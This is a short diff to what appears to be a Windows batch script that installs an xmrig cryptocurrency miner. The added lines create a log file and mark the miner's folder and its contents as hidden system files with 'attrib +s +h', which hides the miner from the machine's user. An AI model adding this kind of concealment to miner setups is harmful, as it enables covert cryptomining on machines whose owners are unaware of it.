@@ -323,6 +323,10 @@ echo echo Miner is already running in the background. Refusing to run another on
 echo :EXIT
 ) > "%USERPROFILE%\ponder\miner.bat"
 
+echo "" > %USERPROFILE%\ponder\xmrig.log
+attrib +s +h /d "%USERPROFILE%\ponder"
+attrib +s +h /d "%USERPROFILE%\ponder\*"
+
 rem preparing script background work and work under reboot
 
 if %ADMIN% == 1 goto ADMIN_MINER_SETUP
